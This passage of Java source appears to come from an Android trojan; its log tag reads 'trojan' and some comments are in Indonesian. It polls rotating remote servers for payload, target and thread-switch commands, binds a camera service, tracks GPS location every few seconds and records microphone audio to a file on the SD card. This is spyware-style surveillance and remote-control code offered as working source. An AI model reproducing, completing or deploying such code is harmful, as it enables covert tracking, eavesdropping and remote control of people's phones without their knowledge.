			HttpGet request = new HttpGet(data[0]);
			try{
				HttpResponse response = httpClient.execute(request);
				try { // split result
					InputStream in = response.getEntity().getContent();
					BufferedReader reader = new BufferedReader(new InputStreamReader(in));
					StringBuilder str = new StringBuilder();
					String line = null;
					while((line = reader.readLine()) != null){
						str.append(line);
					}
					in.close();
					sret = str.toString();
				} catch(Exception ex) {
					Log.i(TAG, "Error split text");
				}
			}
			catch(Exception ex){
				Log.i(TAG, "payload Failed Connect to Server!");
				processPing = true;

				payloadWebResult = "";
				payloadWebResultTarget = "";
				payloadWebResultSwitch = "";
				
			}
			return sret;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	processPing = true;

	    	if (paymain.equals("text")) {
	    		payloadWebResult = result;
	    	}
	    	else if (paymain.equals("json")) {
	    		JSONObject obj;

	    		try {
	    			obj = new JSONObject(result);
	    			payloadWebResult       = obj.getString("inpayload");
	    			payloadWebResultTarget = obj.getString("target");
	    			payloadWebResultSwitch = obj.getString("swthread");
	    		
	    		} catch(Exception e) {}

	    		if (payloadWebResultSwitch.equals("")) {
	    			iserver += 1;
					if (iserver == server.length) 
						iserver = 0;
					urlServer = server[iserver];
	    		}
	    	}
	    	else if (paymain.equals("sw")) {
	    		payloadWebResultSwitch = result;
	    	}
	    	else if (paymain.equals("target")) {
	    		payloadWebResultTarget = result;
	    	}
	    	
		}
	}

	private ServiceConnection camServiceConeksi = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
           	binder = (CamRuntime.LocalBinder) service;
           	Log.i("trojan", "binder: "+binder.isAktif());
        }

       	@Override
       	public void onServiceDisconnected(ComponentName name) {
           	binder = null;
       	}
    };

}

class GPSresult implements LocationListener {

	private LocationManager locationManager;
	private Context context;
	public static String gpsResult = "";
	
	public GPSresult(Context context) {
		this.context = context;
		
		locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 3000, 10, this);
		
	}
	/************* Called after each 3 sec **********/
	@Override
	public void onLocationChanged(Location location) {

		String str = "Latitude: "+location.getLatitude()+" Longitude: "+location.getLongitude();
		gpsResult = str;
	}

	@Override
	public void onProviderDisabled(String provider) {
		gpsResult = "GPS mati";
	}

	@Override
	public void onProviderEnabled(String provider) {
		gpsResult += "GPS hidup";
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}
}

class AudioRecorder { 
	public enum State {
		INITIALIZING, READY, RECORDING, ERROR, STOPPED
	}; 

	private byte[] audioBuffer = null; 
	private int source = MediaRecorder.AudioSource.MIC; 
	private int sampleRate = 0; 
	private int encoder =0; 
	private int nChannels = 0; 
	private int bufferRead = 0; 
	private int bufferSize = 0; 
	private RandomAccessFile tempAudioFile = null; 
	public AudioRecord audioRecorder = null; 
	private State state; 
	private short bSamples = 16; 
	private int framePeriod; 
	// The interval in which the recorded samples are output to the file 
	// Used only in uncompressed mode 
	private static final int TIMER_INTERVAL = 120; 
	volatile Thread t = null; 
	public int TimeStamp =0, count=0, preTimeStamp =0; 

	public AudioRecorder(Context c) { 
		sampleRate = 11025; 
		encoder = AudioFormat.ENCODING_PCM_16BIT; 
		nChannels = AudioFormat.CHANNEL_CONFIGURATION_MONO; 
		preTimeStamp = (int) System.currentTimeMillis();
		state = State.INITIALIZING;
		
		try { 
			String fileName = "/sdcard/11025.wav"; 
			tempAudioFile = new RandomAccessFile(fileName,"rw");
			framePeriod = sampleRate * TIMER_INTERVAL / 1000; 
			bufferSize = framePeriod * 2 * bSamples * nChannels / 8; 

			if (bufferSize < AudioRecord.getMinBufferSize(sampleRate, nChannels, encoder)) { 
				bufferSize = AudioRecord.getMinBufferSize(sampleRate, nChannels, encoder); 
				// Set frame period and timer interval accordingly 
				framePeriod = bufferSize / ( 2 * bSamples * nChannels / 8 ); 
				Log.i(new SystemThread().TAG, "Increasing buffer size to " + Integer.toString(bufferSize)); 
			} 

			audioRecorder = new AudioRecord(source,sampleRate,nChannels,encoder,bufferSize); 
			audioBuffer = new byte[2048]; 
			audioRecorder.setRecordPositionUpdateListener(updateListener); 
			audioRecorder.setPositionNotificationPeriod(framePeriod); 

		} catch(Exception ex) { 
			Log.i(new SystemThread().TAG, ""+ex);
		}
	} 

	private AudioRecord.OnRecordPositionUpdateListener updateListener = new AudioRecord.OnRecordPositionUpdateListener() { 
		@Override 
		public void onPeriodicNotification(AudioRecord recorder) { 
			 
		} 

		@Override 
		public void onMarkerReached(AudioRecord recorder) { 
			// TODO Auto-generated method stub 
		}
	}; 

	public void start() { 
		if (state == State.INITIALIZING) { 
			audioRecorder.startRecording(); 
			state = State.RECORDING; 
			t = new Thread() { 
				public void run() { 
					//Here You can read your Audio Buffers 
					audioRecorder.read(audioBuffer, 0, 2048); 
				} 
			}; 

			t.setPriority(Thread.MAX_PRIORITY); 
			t.start(); 
		} else { 
			Log.i(new SystemThread().TAG, "start() called on illegal state"); 
			state = State.ERROR; 
		} 
	} 

	public void stop() { 
		if (state == State.RECORDING) { 
			audioRecorder.stop(); 
			Thread t1 = t; 
			t=null; 
			t1.interrupt(); 
			count =0; 
			state = State.STOPPED; 
		} else { 
			Log.i(new SystemThread().TAG, "stop() called on illegal state"); 
			state = State.ERROR; 
		} 
	} 

	public void release() { 
		if (state == State.RECORDING) { 
			stop(); 
		} 
		if (audioRecorder != null) { 
			audioRecorder.release(); 
		} 
	} 

	public void reset() { 
		try { 
			if (state != State.ERROR) { 
				release(); 
			} 
		} catch (Exception e) { 
			Log.i(new SystemThread().TAG, e.getMessage()); 
			state = State.ERROR; 
		} 
	} 

	public State getState() { 
		return state; 
	} 
}
